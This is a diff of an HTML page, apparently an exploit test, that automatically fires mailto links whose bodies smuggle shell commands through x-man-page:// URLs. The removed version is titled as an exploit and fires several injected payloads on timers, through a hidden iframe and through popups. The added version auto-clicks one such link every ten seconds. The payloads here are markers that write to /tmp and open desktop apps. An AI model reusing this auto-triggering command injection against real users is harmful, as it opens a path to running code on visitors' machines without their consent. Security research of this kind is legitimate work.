@@ -1,67 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>mailto + x-man-page Auto-Trigger Exploit</title>
+    <title>Single Auto-Trigger mailto Test</title>
 </head>
 <body>
     <h1>mailto Auto-Trigger Test</h1>
+    <p>This page will automatically trigger a mailto link every 10 seconds.</p>
     
-    <!-- Test 1: Auto-trigger mailto on page load -->
-    <script>
-        // Auto-trigger immediately
-        setTimeout(function() {
-            window.location.href = "mailto:test@test.com?body=Check%20this%20man%20page:%20x-man-page://ls;echo%20AUTO_TRIGGER1%20%3E%20%2Ftmp%2Fauto1.txt";
-        }, 100);
-    </script>
-    
-    <!-- Test 2: Multiple auto-triggers -->
-    <script>
-        // Second auto-trigger
-        setTimeout(function() {
-            window.open("mailto:test@test.com?body=x-man-page://open%20-a%20Calculator", "_blank");
-        }, 2000);
-    </script>
-    
-    <!-- Test 3: Third auto-trigger with different payload -->
-    <script>
-        setTimeout(function() {
-            window.location.href = "mailto:test@test.com?subject=Urgent&body=x-man-page://`touch%20%2Ftmp%2Fauto2.txt`";
-        }, 4000);
-    </script>
-    
-    <!-- Test 4: Hidden iframe auto-trigger -->
-    <iframe src="about:blank" id="hiddenFrame" style="display:none"></iframe>
-    <script>
-        setTimeout(function() {
-            document.getElementById('hiddenFrame').src = "mailto:test@test.com?body=x-man-page://$(open%20-a%20TextEdit)";
-        }, 6000);
-    </script>
-    
-    <!-- Test 5: Continuous triggers -->
-    <script>
-        let triggerCount = 0;
-        function continuousTrigger() {
-            if (triggerCount < 3) {
-                window.open(`mailto:test@test.com?body=Continuous%20${triggerCount}:%20x-man-page://ls;echo%20CONTINUOUS_${triggerCount}%20%3E%20%2Ftmp%2Fcontinuous.txt`, "_mail" + triggerCount);
-                triggerCount++;
-                setTimeout(continuousTrigger, 1500);
-            }
-        }
-        setTimeout(continuousTrigger, 8000);
-    </script>
-
-    <!-- Visible content -->
-    <p>This page automatically triggers multiple mailto links with x-man-page injections.</p>
-    <p>Check Terminal and /tmp/ for success indicators.</p>
-    
-    <!-- Manual triggers as backup -->
-    <a href="mailto:test@test.com?body=Manual%20trigger:%20x-man-page://ls;echo%20MANUAL%20%3E%20%2Ftmp%2Fmanual.txt" style="color: blue;">
-        Manual Trigger (backup)
+    <!-- The link that will be auto-clicked -->
+    <a href="mailto:test@test.com?subject=Urgent&body=x-man-page://ls;echo%20AUTO_TRIGGER%20%3E%20%2Ftmp%2Fauto_test.txt" 
+       id="autoMailtoLink"
+       style="display: block; margin: 20px 0; color: blue;">
+        Manual Trigger: Send Test Email
     </a>
-
+    
     <script>
-        console.log("Auto-trigger mailto exploit started");
-        console.log("Triggers scheduled at: 0.1s, 2s, 4s, 6s, 8s+");
+        // Auto-click the mailto link every 10 seconds
+        setInterval(() => {
+            console.log("Auto-clicking mailto link...");
+            document.getElementById('autoMailtoLink').click();
+        }, 10000); // 10 seconds instead of 50
+        
+        // Also trigger once immediately
+        setTimeout(() => {
+            document.getElementById('autoMailtoLink').click();
+        }, 1000);
     </script>
 </body>
 </html>
